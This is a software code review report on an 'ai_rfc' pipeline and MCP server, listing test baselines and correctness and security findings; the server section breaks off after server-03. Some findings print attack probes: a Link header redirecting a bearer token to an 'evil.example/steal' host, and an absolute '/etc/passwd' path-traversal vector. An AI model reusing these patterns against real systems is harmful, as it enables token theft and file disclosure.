# `ai_rfc` whole-codebase code review

**Date:** 2026-09-02 · **Branch:** `feat/arfc-pipeline-and-runtime-anchors`, 162 commits
ahead of `production`, no PR · **Plan:** `docs/superpowers/plans/2026-09-02-ai-rfc-code-review.md`

This reviews all 18,443 lines of the `ai_rfc` substrate across both repositories — the
PANTHER-side package (55 files, 6,933 LOC) and the `harness/` git submodule (59 files,
11,510 LOC, pinned at `0b62bf3`) — plus both test trees. It answers three questions: is
the code sound, is technical debt hiding in it, and are the commands and features
finished.

Three decisions frame it. Both repositories are reviewed, but **fixes may land only on
the PANTHER side**, because the submodule's strings are the completed pilot's instrument.
This run **stops at the report**; no source file is edited. And **registered gaps count as
debt** rather than as accepted design, so the prose register is itself under review.

Severity throughout follows one rule: a finding's *existence* is a claim about code, but
its *severity* is a claim about consequence, which usually depends on runtime state. Every
severity line therefore either names the artifact that confirmed it, or carries the check
that would settle it. There is no separate confidence field, deliberately.

## Baseline, 2026-09-02

Everything below was run in this session, in the worktree, before any reviewer read a line.

| Check | Command | Result |
|---|---|---|
| PANTHER `ai_rfc` suite | `pytest tests/unit/…/ai_rfc/ tests/unit/test_cli/test_ai_rfc_commands.py -n auto` | **390 passed**, 11 warnings, 17.26s |
| harness experiment suite | `pytest harness/experiment/tests/` | **339 passed**, 92.80s |
| harness server suite | `pytest harness/plugins/ai-rfc/server/tests/` | **40 passed**, 24.37s |
| mypy, PANTHER-side | `mypy --follow-imports=silent` on the 8 non-harness subtrees | **10 errors in 6 files**, 55 source files checked |
| mypy, whole tree | same, including `harness/` | 24 errors in 17 files, 114 checked |
| black, PANTHER-side | `black --check` on the 8 non-harness subtrees | **clean — 55 files unchanged** |
| black, whole tree | same, including `harness/` | 4 would reformat, all under `harness/` |
| flake8, PANTHER-side | `flake8 --max-line-length=88` on the 8 non-harness subtrees | **clean — 0 findings** |
| flake8, whole tree | same, including `harness/` | 49 findings, all under `harness/` |

**All three suites pass with zero failures**, totalling 769 tests.

Two invocation notes, both of which cost time to rediscover. `ruff` is *not* installed in
`.venv` — it exists only as a `.pre-commit-config.yaml:32-35` hook that fetches its own
environment, so `.venv/bin/ruff` fails outright. And `flake8` must be given
`--max-line-length=88` explicitly, because it defaults to 79 and runs at
`stages: [manual]`, so its bare output is dominated by E501s that pre-commit would never
raise.

### Three corrections to the expected baseline

**The "587" figure this review expected for the PANTHER suite was a misattribution.** It
was a cross-suite sum recorded at an earlier date, not the count of one suite. Measured
today, every suite has *grown*: 390 / 339 / 40 against the remembered 286 / 263 / 38. No
tests were lost, and nothing regressed.

**PANTHER-side formatting and linting are spotless.** All 4 black reformats and all 49
flake8 findings are inside the `harness/` submodule, a separate repository with its own
conventions that is out of scope for fixes. A single tree-wide number would have
understated the package and overstated the submodule.

**`types-PyYAML` is neither declared nor installed, and it degrades the type baseline.**
`pyproject.toml:98` declares `PyYAML>=6.0,<7.0` as a runtime dependency, but no stub
package accompanies it and `.venv` contains none. Eight of the ten PANTHER-side mypy
errors trace to this one gap: four are `Library stubs not installed for "yaml"`
(`schema.py:14`, `report.py:14`, `coverage/cli.py:11`, `draft/gate.py:18`), and four more
are `Returning Any from function declared to return "str"` at exactly the points where a
`yaml.safe_load` result is returned (`schema.py:207`, `report.py:128`,
`draft/questions.py:153`, `timeline/store.py:87`) — which is what an untyped `yaml` module
produces downstream. The consequence is that **mypy is not checking any YAML-handling path
in a package whose central artifact is a YAML manifest.** The two remaining errors are
independent: a missing annotation for `fragment` at `coverage/cli.py:109`, and one further
`Returning Any`.

SEVERITY: Important — confirmed against `pyproject.toml`, which declares `PyYAML` at line
98 with no `types-PyYAML` beside it, and against `.venv/lib/python3.10/site-packages/`,
which holds `pyyaml-6.0.3.dist-info` and no `types_pyyaml`.

## Established facts

Exploration produced six claims that were never checked, by the same agent pair that also
produced one fabricated quotation and one wrong marker count. Every row below was
re-derived by running the command shown. They are stated here as fact so that the slice
reviewers receive them as settled and spend their budget elsewhere.

| # | Claim | How it was checked | Verdict |
|---|---|---|---|
| F-1 | No `TODO`/`FIXME`/`HACK`/`XXX`/`NotImplementedError`/skip/xfail/`type: ignore` anywhere | `grep -rnE` over the package and both test trees | **Confirmed.** Zero of every one of those classes. |
| F-2 | Zero lint suppressions | same grep | **Refuted.** Seven `# noqa`, all under `harness/`, each with a stated reason. See *Debt backlog*. |
| F-3 | All 13 PANTHER-side verbs have tests | grep each verb across `tests/unit/…/ai_rfc/` | **Confirmed.** |
| F-4 | 8 of 16 MCP tools have no test at the tool boundary | grep each `ai_rfc_*` symbol across the server test tree | **Confirmed exactly.** |
| F-5 | 4 verbs have no test at either layer | grep each verb string across the server test tree | **Confirmed.** |
| F-6 | `preflight`, `render`, `workspace reseal` never reached through `cli.main` | grep `main([...])` invocations across `harness/experiment/tests/` | **Confirmed.** |
| F-7 | No flag is defined but never read | extract every `"--flag"`, then grep its `args.*` consumption | **Confirmed**, after correcting a naive check — see below. |

### F-2: the seven suppressions

`experiment/guard.py:15` (E402) · `experiment/guard.py:59` (BLE001, "blocking is the only
safe exit") · `experiment/workspace.py:126` (ANN202) · `server/tests/conftest.py:13`
(E402) · `server/cli.py:303` (BLE001, "substrate errors surface verbatim") ·
`core/claims.py:41` (ANN202) · `core/questions.py:13` (ANN202, the only one with no
stated reason).

### F-4 and F-5: the untested surfaces

The eight tools with no test at the tool boundary are `ai_rfc_status`,
`ai_rfc_corpus_query`, `ai_rfc_cluster_get`, `ai_rfc_question_draft`,
`ai_rfc_question_export`, `ai_rfc_answer_record`, `ai_rfc_gate` and
`ai_rfc_citation_gate`. Their *core* functions are tested in `test_core.py`; what is
untested is the wrapper each MCP client actually calls, and its registration through
`server.py`'s `ALL_TOOLS` loop.

Four of those are untested at the CLI layer too, so they have no test on **either**
surface a user or an agent can reach: `cluster-get`, `question-draft`, `question-export`
and `answer-record`.

SEVERITY: Important — confirmed against the server test tree, where a grep for each of
the sixteen tool symbols and each of the sixteen verb strings returns no file for these
four. `answer-record` is the load-bearing one: it is the human sign-off path, and the
package README names developer sign-off as one of only two mechanisms that can move
`checked_fraction` off zero. Both of its entry points are unexercised.

### F-6: the three unreached experiment verbs

`preflight`, `render` and `workspace reseal` have tested functions
(`test_preflight.py`, `test_render.py`, `test_workspace.py:207`) but no test that reaches
them through argparse. Only one of the three declares this: `experiment/preflight.py:1-7`
states "Nothing here runs under pytest; the pure parts are tested, the calls are made once
by hand." `render` and `workspace reseal` carry no such statement, so two of the three
gaps are undeclared.

### F-7: the correction, recorded because the naive check was wrong

A first pass extracting every `"--flag"` and grepping for `args.<flag>` reported three
unread flags: `--from`, `--json` and `--version`. All three were false positives.
`pipeline/cli.py:61,93` give `--from` and `--json` explicit `dest="start"` and
`dest="as_json"` — `from` is a Python keyword and cannot be an attribute name — and
`args.start`, `args.until` and `args.as_json` are read 3, 2 and 2 times respectively.
`--version` is `action="version"`, which argparse consumes internally. The four `dest=`
declarations PANTHER-side are `as_json`, `start`, `until` and `verb`, and every one is
read. **No flag is defined but never read.**

## Raw findings

Five reviewers read disjoint slices. Findings are reproduced as filed, with the reviewer's
own severity line. Nothing here is a verdict yet — Task 4 settles the residual conditions.

Every reviewer was told to prefer settling to hedging, and most did: the majority of the
severity lines below say "confirmed against" a probe or an artifact rather than carrying a
condition. That is the single biggest difference from the 2026-08-31 review.

### Reader `core` — package root, `draft/`, `pipeline/`, the click front door (3,444 LOC)

**Strengths.** `test_promotion.py:90-109` asserts that interview+paper and interview+ADR
*stay* at `inferred` — the two-narrative-source route a lazy suite would omit, and exactly
the circularity `PRIMARY_EVIDENCE` exists to block. `models.py:154-169` reports
`confirmed_count_by_req_class` beside the fraction, with a docstring naming the reason:
`0.0` has two readings and only the denominator says which. `report.py:28-35` with
`cli.py:99-104` makes "no findings" distinguishable from "nothing checked".
`state.py:215-229` counts checkpoints per cluster id and requires the record, because a
bare directory reads as a false "2 of 2".

**core-01** · `pipeline/state.py:307`, `pipeline/cli.py:152-157` · correctness
`next_stage` skips `RECOMPUTED` stages, and both `check` and `gate` are `RECOMPUTED`
(`state.py:276,279`), so a default `pipeline run` jumps from `views` to `prose` and never
validates the manifest — contradicting `State.RECOMPUTED`'s own docstring at
`state.py:46-49` ("the runner just performs it").
SEVERITY: Critical — confirmed against a probe workspace holding a manifest whose stored
`confirmed` rests on one ADR anchor: `pipeline run <ws> --strict --json` exits **0** with
`performed: []`, while `pipeline run <ws> --from check --strict` on that same workspace
exits **3** reporting the violation. No test in `pipeline/test_cli.py` runs past mining,
so this is not encoded intent.

**core-02** · `draft/checkpoint.py:69,74-98` · correctness
`write_checkpoint` creates the directory and writes `manifest.yaml` before reading
`timeline.json`, so a failure there leaves a directory that `:69` then refuses to
overwrite forever; `state.py:221-224` counts it as unfrozen and routes the operator
straight back into the refused stage.
SEVERITY: Critical — confirmed: first run exits 1 leaving `['manifest.yaml']`, and after
repairing the input the retry exits 1 with "already exists; a checkpoint is written once".
Recovery is an undocumented manual `rm -rf`. Fix: digest `timeline.json` before `mkdir`,
or write to a temp dir and rename.

**core-03** · `schema.py:141` · correctness
`yaml.safe_load` silently keeps the last of two identically-keyed requirements, so a
manifest with a duplicated id loses a claim and `claim_count` under-reports with no
diagnostic.
SEVERITY: Important — confirmed: two `"R1"` entries load as 1 claim, text `second`.
Duplicates are discarded before `sorted(requirements.items())` at `:152` can see them, so
the fix is a `SafeLoader` subclass with a duplicate-key constructor, not a post-parse check.

**core-04** · `anchors.py:75`, `schema.py:79` · correctness
The module docstring refuses unpinned anchors because "a `path:line` reference into a
moving tree silently points at different code", but `commit` is only `str()`-coerced, and
`git cat-file -e HEAD^{commit}` resolves — so `commit: HEAD` or a branch name verifies
against a moving reference and looks pinned.
SEVERITY: Critical if any authored manifest carries a non-40-hex commit; Minor otherwise —
settled by grepping authored workspace manifests for `commit:` values that are not 40 hex.
A repo-wide grep returns nothing (manifests are written at run time into workspaces the
reviewer could not reach), and `test_anchors.py:22` only ever pins a resolved
`rev-parse HEAD` result, so no negative test exists either.

**core-05** · `draft/gate.py:274-283` · correctness
**S-5 confirmed.** The "no normative change" check compares cited claim id sets. A
revision that rewrites a cited claim's text while citing the same ids passes. Content is
never hashed, though `checkpoint_manifest_sha256` is already in hand and would make that
cheap.
SEVERITY: Important — confirmed by reading; the comparison at `:280` is
`cited_by_tag[entry.tag] != previous_cited`, both `set[str]` of ids.

**core-06** · `schema.py:138,141`; `draft/gate.py:74`; `draft/questions.py:118`;
`pipeline/state.py:205` · api-contract
`yaml.YAMLError` is neither a `SchemaError` nor an `OSError`, so a YAML *syntax* error
escapes every handler in the slice, though `schema.load`'s `Raises:` promises
`SchemaError` "if the document is malformed". `state.py:90`'s `_read_json` catches
`ValueError` precisely so a half-written artifact reports `STALE`; the YAML twin at `:205`
does not.
SEVERITY: Important — confirmed: `pipeline status` on a workspace whose `manifest.yaml`
has an unclosed bracket prints a traceback instead of reporting `stale`, during the
agent-authoring phase that state exists to describe.

**core-07** · `draft/completeness.py:194-197` vs `draft/gate.py:255-257` · api-contract
`run_gate` skips a revision whose tag is absent from the repo and records a finding;
`citation_gaps` calls `cited_ids` unconditionally and raises `CompletenessError`. A
registered-but-untagged revision therefore makes `draft completeness` exit **1** ("input
unreadable") where `gate` exits **3** ("finding") — and an incomplete reconstruction is
the exact thing `completeness` was built to measure.
SEVERITY: Important — confirmed by reading both paths; `gate.py:256` carries the
`if entry.tag not in tags: continue` guard, `completeness.py:194` carries none.

**core-08** · `draft/gate.py:112-116`, `draft/checkpoint.py:33-36`,
`pipeline/state.py:174-176`, `draft/completeness.py:48-57` · duplication
Four separate readers of `clusters.jsonl`. Only `completeness.load_clusters` filters blank
lines and wraps `JSONDecodeError`; the other three `json.loads` every line and index
`["id"]`/`["ordinal"]` bare.
SEVERITY: Important — confirmed: a trailing blank line in `clusters.jsonl` makes
`pipeline status` traceback. One shared reader fixes all three.

**core-09** · `promotion.py:70`, `schema.py:119` · correctness
`signed_off_by` is the single strongest promotion lever and is accepted as any non-empty
string, unstripped — unlike `text`, which `schema.py:104` strips.
SEVERITY: Important — confirmed: a claim with one ADR anchor and `signed_off_by="   "`
adjudicates to `confirmed`.

**core-10** · `draft/gate.py:274-279` · correctness
When the predecessor revision's tag was unreadable it is absent from `cited_by_tag`, so
`previous_cited` falls back to `set()` and a genuinely unchanged revision is reported as
having changed its cited set.
SEVERITY: Minor — confirmed by reading; it adds a spurious second finding beside the real
one.

### Reader `evidence` — `forge/` `history/` `timeline/` `views/` `coverage/` (3,532 LOC)

Baseline for this slice: 155 tests pass. Every finding below is a green-suite finding.

**Strengths.** `views/emit.py:21-40` — `_DIFF_ARGS` neutralises every gitconfig drift
source the reviewer could name (`--no-ext-diff`, `--no-textconv`, `--no-renames`,
`--full-index`, explicit prefixes, pinned algorithm), with the reasoning recorded.
`coverage/commit.py:55-61` — `rev-parse --verify <rev>^{commit}` plus a comment naming the
plain-`rev-parse` trap it replaced (which exits 0 for any 40-hex string).
`history/git_log.py:105-118` — NUL records, `maxsplit`, and a field-count guard kept
deliberately after `maxsplit` made it redundant. `views/emit.py:313` correctly reports
drift when verify mode differs from emit mode; the reviewer checked this is not accidental.

**evidence-01** · `history/git_log.py:141-142`, `views/emit.py:289`,
`timeline/build.py:142` · correctness
`--no-merges` gives every merge commit `file_count=0` and zero file rows, so a merge's own
first-parent diff is invisible in `files.jsonl`; `views` compensates by unioning members,
which fails exactly when the merge introduces content of its own. Probe: a merge adding
`resolved.txt` during resolution produced `view.json file_set=[s.txt, s2.txt]` beside a
`span.diff` touching `resolved.txt`, with `files_complete: true`. Three documents ride on
this: `git_log.py:141` claims merges "produce no diff against their first parent" (the
probe's merge diffs 3 paths); `models.py:35` and the README field table call `file_count`
"the **true** number of paths the commit touched"; and `files_complete` means only "no
commit hit the cap".
SEVERITY: Critical if any merge on the target's spine has a non-empty first-parent diff;
Important otherwise — settled by listing merge commits' own first-parent name-only output
over the clone and counting non-empty lines.

**evidence-02** · `forge/fetch.py:131-135` · security
`_paginated_github` takes the next URL from the remote's `Link` header and passes it to
`_get_json`, which attaches `Authorization` (`:109-110`) with no host check. The same loop
has no page bound, so a self-referential `Link` runs forever.
SEVERITY: Critical — confirmed against an injected-transport run: a page-1
`Link: <https://evil.example/steal>; rel="next"` produced a second call to
`https://evil.example/steal` carrying `Authorization: Bearer SECRET-TOKEN`.

**evidence-03** · `forge/fetch.py:52-53`, `forge/store.py:43-45` · security
`api_base` ignores `self.host` when `kind == "github"`. Confirmed:
`parse_url("https://github.enterprise.example/org/proj", "github")` yields host
`github.enterprise.example` and api_base `https://api.github.com/repos/org/proj`, so
`GITHUB_TOKEN` goes to api.github.com, and `meta.json` then records
`api_base: https://api.github.com` beside `host: github.enterprise.example`. The `--host`
help at `cli.py:57-61` explicitly invites this ("pass this explicitly for a self-hosted
instance").
SEVERITY: Critical if GITHUB_TOKEN is set while `--host github` targets a non-github.com
host; Important otherwise — settled by whether any recorded invocation does so.

**evidence-04** · `coverage/cli.py:131` · correctness
The provenance record writes `"commit": args.commit`, the ref as typed, while
`propose.py:73-76` argues at length that only the resolved sha may be recorded. Confirmed:
`--commit main` produced `runtime-anchors.json` with `"commit": "main"` beside a proposal
carrying `004bdf65…`. `SkippedAnchor` (`propose.py:37-44`) has no commit field, so in
MARK's zero-proposal case the artifact records no resolved sha at all.
SEVERITY: Important — confirmed against `runtime-anchors.json`, which shows two spellings
of "the commit" in one file.

**evidence-05** · `tests/…/coverage/test_propose.py:93-104` · test-gap
`test_the_provenance_names_what_the_anchor_actually_claims` asserts
`record["commit"] == commit`, but the `java_repo` fixture supplies an already-resolved
sha, so it cannot distinguish `args.commit` from `proposal.commit`. It is the named guard
for evidence-04 and passes against the defect.
SEVERITY: Important — confirmed against the fixture at `coverage/conftest.py:40`, which
returns a resolved HEAD.

**evidence-06** · `timeline/corpus.py:51` · api-contract
`json.loads(line)` sits outside the `try` that converts failures to `TimelineError`, and
`cli.py:98` catches only `(TimelineError, OSError)`. Confirmed: a corpus with a trailing
blank line and one with non-JSON both raised an uncaught `JSONDecodeError` instead of
exiting 1. `history/store.py:142` filters blank lines and `timeline/cli.py:125` catches
`ValueError` for the forge snapshot — the corpus path is the inconsistent one.
SEVERITY: Important — confirmed against a run, which tracebacks where the contract
specifies exit 1.

**evidence-07** · `forge/store.py:118-141` · correctness
`mkdir` at `:124` precedes the sort keys that raise, so a malformed record leaves a
half-created snapshot that the write-once rule at `:119` then refuses to replace;
`KeyError` is outside `cli.py:180`'s catch. Confirmed:
`write_snapshot(..., pulls=[{}], ...)` raised uncaught `KeyError: 'number'` and left an
empty snapshot directory. `adopt.py:5-8` promises "an adopted snapshot cannot carry
anything a fetched one could not", but `read_records` validates only that sections are
lists of dicts.
SEVERITY: Important — confirmed against a run, which left the directory on disk.

**evidence-08** · `views/emit.py:260` · correctness
`emit_views` reads `forge_snapshot` with no comparison against
`timeline["forge_snapshot"]["meta_sha256"]`, and `source` at `:263-267` records no
snapshot identity, so `evidence/pr.json` cannot be traced to the snapshot it came from and
`--verify` cannot detect a swapped one. This is the substantive extension of S-6: the
module docstring's "every input is digest-guarded" is false for the forge snapshot.
SEVERITY: Important if views are ever emitted with `--forge` against a re-fetched
snapshot; Minor otherwise — settled by whether more than one snapshot directory exists for
a target.

**evidence-09** · `forge/cli.py:212-214` · correctness
`fidelity_ceiling` is keyed on token presence, not on observed denials, so an anonymous
run that fetched full discussion with zero denials is graded `"pulls"`.
`pipeline/state.py:134-135` reads exactly this to decide whether a snapshot is
route-capped. The record that anonymous MARK fetches work and produced enrichments makes
this the live path, not a hypothetical one.
SEVERITY: Important — confirmed against `pipeline/state.py:134-135`, which grades on the
value.

**evidence-10** · `views/emit.py:271-272` · correctness
`cluster_dir.mkdir(exist_ok=True)` never prunes, so re-emitting after a rebuilt timeline
leaves orphan cluster folders from the previous generation beside the current ones, and
`verify_views` iterates only `emitted` so it never inspects them.
SEVERITY: Important if `--out` is reused across timeline rebuilds; Minor otherwise —
settled by whether the pipeline emits into a fresh directory each run.

**evidence-11** · `coverage/jacoco.py:65-66` · api-contract
`int(number)` and `int(line.get("ci","0"))` raise bare `ValueError` on well-formed XML with
a malformed attribute; `cli.py:104` catches
`(SchemaError, CoverageError, PinError, OSError)`. Confirmed: `read()` on `ci="many"`
raised `ValueError: invalid literal for int()`.
SEVERITY: Important if a coverage producer ever emits a non-integer counter; Minor
otherwise — settled by whether any real report does; the reviewer could not reach one.

**evidence-12** · `history/aggregates.py`, whole file (56 lines) · dead-code
`history_shape`/`HistoryShape` are exported from `history/__init__.py` and referenced only
by `tests/…/history/test_aggregates.py`; no production caller anywhere in the package or
its docs.
SEVERITY: Minor — confirmed against a repo-wide grep for both names.

**evidence-13** · `tests/…/views/conftest.py:33` · test-gap
The fixture's only merge is clean, so union-over-members always covers it and the suite
structurally cannot observe evidence-01.
SEVERITY: Important — confirmed against the fixture, which merges `feat` with no
resolution step.

**evidence-14** · `history/index.py:123-133` · resource
Distinct from the declared design at `:111-112`: when `_digest` at `:126` raises
`FileNotFoundError` for a missing JSONL, the connection opened at `:123` is never closed —
only the stale-digest path closes it. The docstring declares neither that leak nor the
`sqlite3.OperationalError` a corrupt index raises at `:124`.
SEVERITY: Minor — confirmed by reading; the leak is bounded by process lifetime.

**evidence-15** · `forge/fetch.py:150` · correctness
`int(next_page)` raises an uncaught `ValueError` on a non-numeric `x-next-page`, and a
server repeating the same page number loops forever. Sibling of evidence-02 on the GitLab
side.
SEVERITY: Minor — confirmed by reading; requires a misbehaving or hostile instance.

**evidence-16** · `history/git_log.py:188` · correctness
Commit markers are detected by a leading `\x01`, which is permitted inside a path, so a
path starting with `\x01` is parsed as a commit marker and misattributes the rows that
follow. Same class as README trap 1, unlisted for the file-changes pass.
SEVERITY: Minor — confirmed by reading; pathological input.

**evidence-17** · `timeline/build.py:108-115`, `views/emit.py:122` · correctness
Two merged pulls sharing a landing sha silently collapse (`forced[sha] = pull`), as do two
pulls sharing a number in `_read_forge_records`; neither appears in `cli.py:171-176`'s
unmatched count, so the reported enrichment total and the actual attribution can disagree
with no diagnostic.
SEVERITY: Minor — confirmed by reading; requires duplicate landing shas or numbers.

**evidence-18** · three small items, each confirmed by reading · correctness
`timeline/build.py:130` records `subject_pr_hint` only for PR clusters, so a direct-push
commit carrying `(#N)` — the default squash subject — loses its hint in an epoch cluster,
which is where a forge-less run needs it most. `timeline/store.py:66` writes a bare
newline for an empty cluster list where `forge/store.py:50` handles the same case
correctly (unreachable via the CLI today). `coverage/propose.py:136` rebuilds the `known`
suffix set on every anchor, making resolution O(anchors × report lines).
SEVERITY: Minor — confirmed by reading; none changes a recorded value today.

**Known items, this reader's verdicts.** S-3 confirmed at `fetch.py:97`. S-4 confirmed at
`fetch.py:112-113`, with the added detail that `cli.py:213` grades on `result.throttled`
without being able to tell the two apart. S-6 confirmed at `emit.py:313-318`; the reviewer
judges evidence-08 the substantive part of that gap rather than the docstring wording.
`open_index`'s declared non-closing return at `:111-112` is adequate for the happy path —
the README teaches closing explicitly — and evidence-14 is the undeclared residue.

**Assessment.** The slice is sound in construction — the determinism, digest-guarding and
refuse-rather-than-guess discipline are genuinely careful, and most of what was found sits
at the edges of that discipline rather than in its middle. Fix evidence-01 first: it is the
one wrong number that looks right in the artifact a human actually reads, and it needs a
design decision (record the merge's own first-parent diff, or drop the "true count" claim
and rename `files_complete`) rather than a patch. evidence-04 is the cheapest Important —
one identifier.

### Reader `server` — `harness/plugins/ai-rfc/server/src/ai_rfc_server/` (1,659 LOC)

**Partial.** This reader's delivery was truncated after server-03; the remainder was
requested and is appended below when it arrives. The reviewer separately reported that
server-22 (an `mcp>=1.0` lower bound) is the one item it could not settle, because PyPI is
unreachable through the sandbox proxy; it stands as conditional with the settling command
named.

**Strengths.** `claims.py:60-66` — every manifest write round-trips through the
substrate's strict schema in a scratch directory *before* `os.replace`, so an invalid
manifest cannot land; `upsert_claim:118` then re-reads from disk and returns what actually
stored rather than echoing the input. `claims.py:22-36,95-99` — `status` is excluded from
`_WRITABLE_FIELDS` *and* separately rejected with an explanatory message, so an agent
cannot assert a standing its evidence does not support. `draft.py:114-140` —
tag-then-verify-then-delete, with the ordering rationale at `:76-79` explaining why the
citation gate cannot run first, and `rolled_back` reported rather than hidden.
`pyproject.toml:13-19` — the version pin carries the incident that motivates it, including
the failure mode (tools silently absent, session still "succeeds").

**The decisive fact this reader established.** `promotion.py:70` is
`if claim.signed_off_by: return Status.CONFIRMED` — a sign-off promotes a claim straight
to the top status, bypassing every evidence-class rule. Several findings below and
core-09 all terminate here.

**S-1 confirmed** (`queries.py:22,58`). The cap is disclosed in both frontends' help text
(`tools.py:24`, `cli.py:50`) but never in the *return value*, and `fetchmany` never learns
the total — so an agent knows a cap exists and cannot tell whether it bit. Judging the
remedy as well as the defect: the rationale at `:16-21` ("a query needing more rows is a
query that should be narrowed") is self-defeating, because an agent cannot narrow a query
it does not know was truncated; the fix must change that comment, not only the code. The
minimum honest form is `fetchmany(_ROW_CAP + 1)` returning `{rows, truncated}`, matching
the pattern `:109-110` already names. That is a list→dict wire change for the CLI's JSON
consumer, and `test_parity.py` covers no `corpus-query` pair, so a parity test must land
with it.

**S-2 confirmed** (`questions.py:157`), and the sharper vector is an **absolute** path
rather than `../`: `Path("/ws")/"interviews"/"/etc/passwd"` is `/etc/passwd` — pathlib
discards the left operand entirely — and `transcript.rsplit(".",1)[0]` at `:184` then
records that clean absolute path as the evidence locator. The same unsanitized join
recurs at `queries.py:118` (`cluster_id`), `gates.py:58` and `revisions.py:41`, and
`gates.py:52-55` passes `--cluster <id>` to a substrate that creates `--out/<id>/`.

**server-01** · `questions.py:163` · security/correctness
`quote not in transcript_path.read_text()` — `"" in anything` is True, so `quote=""`
passes the only check that an answer happened. `cli.py:137`'s `required=True` does not
exclude `--quote ""`, and the tool has no minimum. Combined with S-2 this reduces the
sign-off precondition to "some readable file exists".
SEVERITY: Critical — confirmed against `promotion.py:70`, where `signed_off_by` returns
`Status.CONFIRMED` unconditionally, so this path writes the top status with no evidence.

**server-02** · `questions.py:62-67` · correctness
`question_id` is only auto-allocated when `None`; an explicit id is never checked for
collision, and `dump_questions` (`draft/questions.py:138-152`) renders
`rendered[question.id] = body`, a dict keyed by id. So `[*existing, entry]` at `:77`
**silently overwrites** an existing register entry, including a recorded human answer, and
the return value reports success. Exposed on both frontends (`tools.py:67`,
`cli.py:117-119`).
SEVERITY: Critical — confirmed against `draft/questions.py:152`, which keys by id, making
the overwrite silent and unrecoverable from the register.

**server-03** · `questions.py:154,170-179` · correctness
Only existence is checked; the entry is unconditionally rebuilt as `ANSWERED`. A withdrawn
question becomes answered, and re-answering overwrites `answer`/`answered_by`/
`answered_at` — so a second call with `author_confirmed_exact_text=True` grants the
sign-off the first call withheld.
SEVERITY: Important — confirmed against `draft/questions.py`.
